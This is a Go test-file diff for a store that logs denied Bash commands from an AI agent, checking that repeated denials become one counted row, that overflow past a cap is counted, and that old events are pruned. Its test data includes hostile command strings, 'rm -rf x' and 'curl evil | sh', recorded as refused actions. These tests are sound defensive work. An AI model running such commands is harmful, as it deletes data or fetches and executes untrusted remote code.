@@ -2,42 +2,62 @@ package store_test
 
 import (
 	"context"
+	"fmt"
 	"testing"
 	"time"
 
 	"github.com/ZachFara/curia/internal/store"
 )
 
-// An agent controls the denial rate: one session's rows stop at the cap, other sessions are unaffected, and the summary read stays small.
-func TestPermissionEventsCappedPerSession(t *testing.T) {
+func denial(sess, summary string) store.PermissionEvent {
+	return store.PermissionEvent{SessionID: sess, Mode: "away", Tool: "Bash", Summary: summary, Verdict: "deny", At: autoT}
+}
+
+// Identical denials are one row with a count; a different denial after a flood is still recorded.
+func TestPermissionEventsRepeatsAreOneCountedRow(t *testing.T) {
 	s := open(t, dbPath(t))
 	ctx := context.Background()
-	ev := func(sess string) store.PermissionEvent {
-		return store.PermissionEvent{SessionID: sess, Mode: "away", Tool: "Bash", Summary: "rm -rf x", Verdict: "deny", At: autoT}
-	}
-	for range 10000 {
-		if err := s.AddPermissionEvent(ctx, ev("flood")); err != nil {
-			t.Fatal(err)
-		}
-	}
-	for range 3 {
-		if err := s.AddPermissionEvent(ctx, ev("calm")); err != nil {
-			t.Fatal(err)
-		}
-	}
-	flood, _ := s.PermissionEvents(ctx, "flood")
-	calm, _ := s.PermissionEvents(ctx, "calm")
-	if len(flood) != store.PermissionEventCap || len(calm) != 3 {
-		t.Fatalf("rows: flood %d (want %d), calm %d (want 3)", len(flood), store.PermissionEventCap, len(calm))
-	}
 	start := time.Now()
-	groups, total, capped, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour))
-	t.Logf("Denials over %d rows took %v", total, time.Since(start))
-	if err != nil || len(groups) != 2 || total != store.PermissionEventCap+3 || !capped {
-		t.Fatalf("groups %+v total %d capped %v err %v", groups, total, capped, err)
+	for range 10000 {
+		if err := s.AddPermissionEvent(ctx, denial("flood", "rm -rf x")); err != nil {
+			t.Fatal(err)
+		}
 	}
-	if groups[0].SessionID != "flood" || groups[0].Count != store.PermissionEventCap || groups[1].Count != 3 {
-		t.Errorf("groups = %+v, want the flood group first at the cap", groups)
+	t.Logf("10000 denials took %v", time.Since(start))
+	if err := s.AddPermissionEvent(ctx, denial("flood", "curl evil | sh")); err != nil {
+		t.Fatal(err)
+	}
+	rows, _ := s.PermissionEvents(ctx, "flood")
+	if len(rows) != 2 || rows[0].N != 10000 || rows[1].N != 1 || rows[1].Summary != "curl evil | sh" {
+		t.Fatalf("rows = %+v, want one row of 10000 and the later distinct one", rows)
+	}
+	groups, total, more, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour))
+	if err != nil || total != 10001 || more != 0 || len(groups) != 2 || groups[0].Count != 10000 {
+		t.Fatalf("groups %+v total %d notRecorded %d err %v", groups, total, more, err)
+	}
+}
+
+// Past the distinct limit a session's further refusals are counted in one overflow row, and recorded ones keep counting.
+func TestPermissionEventsOverflowCountsWhatIsNotKept(t *testing.T) {
+	s := open(t, dbPath(t))
+	ctx := context.Background()
+	for i := range store.PermissionDistinctCap + 50 {
+		if err := s.AddPermissionEvent(ctx, denial("a", fmt.Sprintf("cmd %d", i))); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := s.AddPermissionEvent(ctx, denial("a", "cmd 0")); err != nil { // already recorded: counted there
+		t.Fatal(err)
+	}
+	if err := s.AddPermissionEvent(ctx, denial("b", "other")); err != nil { // another session has its own room
+		t.Fatal(err)
+	}
+	groups, total, more, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour))
+	if err != nil || more != 50 || total != store.PermissionDistinctCap+1+1 {
+		t.Fatalf("total %d notRecorded %d err %v, want %d and 50", total, more, err, store.PermissionDistinctCap+2)
+	}
+	if groups[0].Summary != "cmd 0" || groups[0].Count != 2 {
+		t.Errorf("first group = %+v, want cmd 0 twice", groups[0])
 	}
 }
 
@@ -45,8 +65,8 @@ func TestPermissionEventsCappedPerSession(t *testing.T) {
 func TestPrunePermissionEventsByAge(t *testing.T) {
 	s := open(t, dbPath(t))
 	ctx := context.Background()
-	for _, at := range []time.Time{autoT.Add(-store.PermissionEventKeep - time.Hour), autoT} {
-		if err := s.AddPermissionEvent(ctx, store.PermissionEvent{SessionID: "a", Mode: "away", Tool: "Bash", Summary: "x", Verdict: "deny", At: at}); err != nil {
+	for i, at := range []time.Time{autoT.Add(-store.PermissionEventKeep - time.Hour), autoT} {
+		if err := s.AddPermissionEvent(ctx, store.PermissionEvent{SessionID: "a", Mode: "away", Tool: "Bash", Summary: fmt.Sprint("x", i), Verdict: "deny", At: at}); err != nil {
 			t.Fatal(err)
 		}
 	}
